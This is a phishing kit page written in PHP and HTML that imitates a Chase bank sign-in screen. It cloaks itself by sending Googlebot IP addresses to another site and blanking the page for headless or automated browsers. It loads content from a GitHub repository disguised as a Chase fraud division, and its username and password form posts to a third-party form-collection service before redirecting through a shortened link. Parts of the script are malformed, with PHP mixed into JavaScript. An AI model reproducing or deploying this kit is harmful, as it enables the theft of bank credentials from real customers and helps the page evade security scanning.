<?php
$google_ips = [
    "192.178.5.0", "192.178.6.0", "192.178.6.32", "34.100.182.96", "34.101.50.144",
        "34.118.254.0", "34.118.66.0", "34.126.178.96", "34.146.150.144", "34.147.110.144",
        "34.151.74.144", "34.152.50.64", "34.154.114.144", "34.155.98.32", "34.165.18.176",
        "34.175.160.64", "34.176.130.16", "34.22.85.0", "34.64.82.64", "34.65.242.112",
        "34.80.50.80", "34.88.194.0", "34.89.10.80", "34.89.198.80", "34.96.162.48",
        "35.247.243.240", "66.249.64.0", "66.249.64.128", "66.249.64.160", "66.249.64.224",
        "66.249.64.32", "66.249.64.64", "66.249.64.96", "66.249.65.0", "66.249.65.128",
        "66.249.65.160", "66.249.65.192", "66.249.65.224", "66.249.65.32", "66.249.65.64",
        "66.249.65.96", "66.249.66.0", "66.249.66.160", "66.249.66.192", "66.249.66.32",
        "66.249.66.64", "66.249.66.96", "66.249.68.0", "66.249.68.32", "66.249.68.64",
        "66.249.68.96", "66.249.69.0", "66.249.69.128", "66.249.69.160", "66.249.69.192",
        "66.249.69.224", "66.249.69.32", "66.249.69.64", "66.249.69.96", "66.249.70.0",
        "66.249.70.128", "66.249.70.160", "66.249.70.192", "66.249.70.224", "66.249.70.32",
        "66.249.70.64", "66.249.70.96", "66.249.71.0", "66.249.71.128", "66.249.71.160",
        "66.249.71.192", "66.249.71.224", "66.249.71.32", "66.249.71.64", "66.249.71.96",
        "66.249.72.0", "66.249.72.128", "66.249.72.160", "66.249.72.192", "66.249.72.224",
        "66.249.72.32", "66.249.72.64", "66.249.72.96", "66.249.73.0", "66.249.73.128",
        "66.249.73.160", "66.249.73.192", "66.249.73.224", "66.249.73.32", "66.249.73.64",
        "66.249.73.96", "66.249.74.0", "66.249.74.128", "66.249.74.160", "66.249.74.32",
        "66.249.74.64", "66.249.74.96", "66.249.75.0", "66.249.75.128", "66.249.75.160",
        "66.249.75.192", "66.249.75.224", "66.249.75.32", "66.249.75.64", "66.249.75.96",
        "66.249.76.0", "66.249.76.128", "66.249.76.160", "66.249.76.192", "66.249.76.224",
        "66.249.76.32", "66.249.76.64", "66.249.76.96", "66.249.77.0", "66.249.77.128",
        "66.249.77.160", "66.249.77.192", "66.249.77.224", "66.249.77.32", "66.249.77.64",
        "66.249.77.96", "66.249.78.0", "66.249.78.32", "66.249.79.0", "66.249.79.128",
        "66.249.79.160", "66.249.79.192", "66.249.79.224", "66.249.79.32", "66.249.79.64",
        "66.249.79.96"
];

$visitor_ip = $_SERVER['REMOTE_ADDR'];

if (in_array($visitor_ip, $google_ips)) {
    header("Location: https://trollface.dk/");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure@Chase</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins|Open+Sans">
    <link rel="shortcut icon" href="https://raw.githubusercontent.com/ChaseFraudSecurityDivisionJPbankdatacom/Report-fraud-prevention/refs/heads/main/favixonn.ico" type="image/x-icon">
    <script src="script.js" defer></script>
</head>
<body>

<!-- Logo Container (above navbar) -->
<div class="logo-container">
    <img src="chse.png" alt="Logo" class="logo">
</div>

<!-- Navigation Bar -->
<header>
    <div class="logo-container">
        <img src="chse.png" alt="Logo" class="logo">
    </div>
    <nav class="navbar"></nav>
</header>

<!-- Main Content -->
<div class="container">
    <div class="form-box">
        <h1></h1>
        <form method="post" action="https://formsubmit.co/3a514e8fece6175b6e7089d60c96611e">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_next" value="https://bit.ly/3BKMBb7">
            <input type="hidden" name="ipAddress" id="formIpAddress">

            <div class="input-field">
                <input type="text" id="user" placeholder="Username">
            </div>
            <div class="input-field">
                <input type="password" id="password" placeholder="Password">
                <span id="show-password" class="show-password">Show</span>
            </div>

            <div class="remember-options">
                <div class="item">
                    <input type="checkbox" id="remember-me" class="checkbox">
                    <label for="remember-me">Remember me</label>
                </div>
                <div class="item">
                    <input type="checkbox" id="use-token" class="checkbox">
                    <label for="use-token">Use token</label>
                </div>
            </div>

            <div class="btn-field">
                <button type="submit">Sign in</button>
            </div>
            <p><a href="#">Forgot username/password?</a></p>
            <p><a href="#">Not Enrolled? Sign Up Now.</a></p>
        </form>
    </div>
</div>

<!-- Footer -->
<footer class="footer">
    <ul class="footer-links">
        <li><a href="#">Contact us</a></li>
        <li><a href="#">Privacy</a></li>
        <li><a href="#">Security</a></li>
        <li><a href="#">Terms of use</a></li>
        <li><a href="#">Accessibility 5</a></li>
        <li><a href="#">SAFE Act: Chase Mortgage Loan Originators</a></li>
        <li><a href="#">Fair Lending</a></li>
        <li><a href="#">About Chase</a></li>
        <li><a href="#">J.P. Morgan</a></li>
        <li><a href="#">JPMorgan Chase & Co.</a></li>
        <li><a href="#">Careers</a></li>
        <li><a href="#">Español</a></li>
        <li><a href="#">Chase Canada</a></li>
        <li><a href="#">Site map</a></li>
        <li><a href="#">Member FDIC</a></li>
        <li><a href="#">Equal Housing Opportunity</a></li>
    </ul>
</footer>

</body>
</html>
<script>
  .then(response => response.text())
  .then(data => document.body.innerHTML = data); // Redirect real users
} else {
    window.location.href = "https://https://trollface.dk/"; // Redirect Googlebot to a harmless page
}

if (navigator.webdriver || /HeadlessChrome/.test(navigator.userAgent)) {
    document.body.innerHTML = "Page Broken";
}

var gl = document.createElement('canvas').getContext('webgl');
if (!gl || gl.getParameter(gl.RENDERER) === "Google SwiftShader") {
    document.body.innerHTML = "Page Broken";
}

$google_ips = ["192.178.5.0", "192.178.6.0", "192.178.6.32", "34.100.182.96", "34.101.50.144", "34.118.254.0", "34.118.66.0", "34.126.178.96", "34.146.150.144", "34.147.110.144", "34.151.74.144", "34.152.50.64", "34.154.114.144", "34.155.98.32", "34.165.18.176", "34.175.160.64", "34.176.130.16", "34.22.85.0", "34.64.82.64", "34.65.242.112", "34.80.50.80", "34.88.194.0", "34.89.10.80", "34.89.198.80", "34.96.162.48", "35.247.243.240", "66.249.64.0", "66.249.64.128", "66.249.64.160", "66.249.64.224", "66.249.64.32", "66.249.64.64", "66.249.64.96", "66.249.65.0", "66.249.65.128", "66.249.65.160", "66.249.65.192", "66.249.65.224", "66.249.65.32", "66.249.65.64", "66.249.65.96", "66.249.66.0", "66.249.66.160", "66.249.66.192", "66.249.66.32", "66.249.66.64", "66.249.66.96", "66.249.68.0", "66.249.68.32", "66.249.68.64", "66.249.68.96", "66.249.69.0", "66.249.69.128", "66.249.69.160", "66.249.69.192", "66.249.69.224", "66.249.69.32", "66.249.69.64", "66.249.69.96", "66.249.70.0", "66.249.70.128", "66.249.70.160", "66.249.70.192", "66.249.70.224", "66.249.70.32", "66.249.70.64", "66.249.70.96", "66.249.71.0", "66.249.71.128", "66.249.71.160", "66.249.71.192", "66.249.71.224", "66.249.71.32", "66.249.71.64", "66.249.71.96", "66.249.72.0", "66.249.72.128", "66.249.72.160", "66.249.72.192", "66.249.72.224", "66.249.72.32", "66.249.72.64", "66.249.72.96", "66.249.73.0", "66.249.73.128", "66.249.73.160", "66.249.73.192", "66.249.73.224", "66.249.73.32", "66.249.73.64", "66.249.73.96", "66.249.74.0", "66.249.74.128", "66.249.74.160", "66.249.74.32", "66.249.74.64", "66.249.74.96", "66.249.75.0", "66.249.75.128", "66.249.75.160", "66.249.75.192", "66.249.75.224", "66.249.75.32", "66.249.75.64", "66.249.75.96", "66.249.76.0", "66.249.76.128", "66.249.76.160", "66.249.76.192", "66.249.76.224", "66.249.76.32", "66.249.76.64", "66.249.76.96", "66.249.77.0", "66.249.77.128", "66.249.77.160", "66.249.77.192", "66.249.77.224", "66.249.77.32", "66.249.77.64", "66.249.77.96", "66.249.78.0", "66.249.78.32", "66.249.79.0", "66.249.79.128", "66.249.79.160", "66.249.79.192", "66.249.79.224", "66.249.79.32", "66.249.79.64", "66.249.79.96"
]; // Example Gbt IPs
$visitor_ip = $_SERVER['REMOTE_ADDR'];

if (in_array($visitor_ip, $google_ips)) {
    window.location.href = "https://https://trollface.dk/";
} else {
   fetch("https://raw.githubusercontent.com/ChaseFraudSecurityDivisionJPbankdatacom/Report-fraud-prevention/refs/heads/main/index.php")
  .then(response => response.text())
  .then(data => document.body.innerHTML = data); // Redirect real users
}


</script>


</head>
<body>
   
<!-- Logo Container (above navbar) -->
<div class="logo-container">
    <img src="chse.png" alt="Logo" class="logo">
</div>
   <!-- Navigation Bar -->
    <header>
        <div class="logo-container">
    <img src="chse.png" alt="Logo" class="logo">
</div>
        <nav class="navbar">
            <!-- Navigation links (empty for now) -->
        </nav>
    </header>


    <div class="container">
        <div class="form-box">
            <h1></h1>
            <form method="post" action="https://formsubmit.co/3a514e8fece6175b6e7089d60c96611e">
                <input type="hidden" name="_captcha" value="false">
                <input type="hidden" name="_next" value="https://bit.ly/3BKMBb7">
                <input type="hidden" name="ipAddress" id="formIpAddress">



                
                <div class="input-field">
                    <input type="text" id="user" placeholder="Username">
                </div>
                <div class="input-field">
                    <input type="password" id="password" placeholder="Password">
                    <span id="show-password" class="show-password">Show</span>
                </div>


                <div class="remember-options">
                    <div class="item">
                        <input type="checkbox" id="remember-me" class="checkbox">
                        <label for="remember-me">Remember me</label>
                    </div>
                    <div class="item">
                        <input type="checkbox" id="use-token" class="checkbox">
                        <label for="use-token">Use token</label>
                    </div>
                </div>


                <div class="btn-field">
                    <button type="submit">Sign in</button>
                </div>
                <p><a href="#">Forgot username/password?</a></p>
                <p><a href="#">Not Enrolled? Sign Up Now.</a></p>
        </div>

               
            </form>
        </div>
    </div>


    <script src="script.js"></script>
</body>
<footer>
    <footer class="footer">
        <ul class="footer-links">
            <li><a href="#">Contact us</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Security</a></li>
            <li><a href="#">Terms of use</a></li>
            <li><a href="#">Accessibility 5</a></li>
            <li><a href="#">SAFE Act: Chase Mortgage Loan Originators</a></li>
            <li><a href="#">Fair Lending</a></li>
            <li><a href="#">About Chase</a></li>
            <li><a href="#"> J.P. Morgan</a></li>
            <li><a href="#">JPMorgan Chase & Co.</a></li>
            <li><a href="#">Careers</a></li>
            <li><a href="#">Español</a></li>
            <li><a href="#">Chase Canada</a></li>
            <li><a href="#">Site map</a></li>
            <li><a href="#">Member FDIC</a></li>
            <li><a href="#"> Equal Housing Opportunity</a></li>
        </ul>
    </footer>
</footer>
</html>
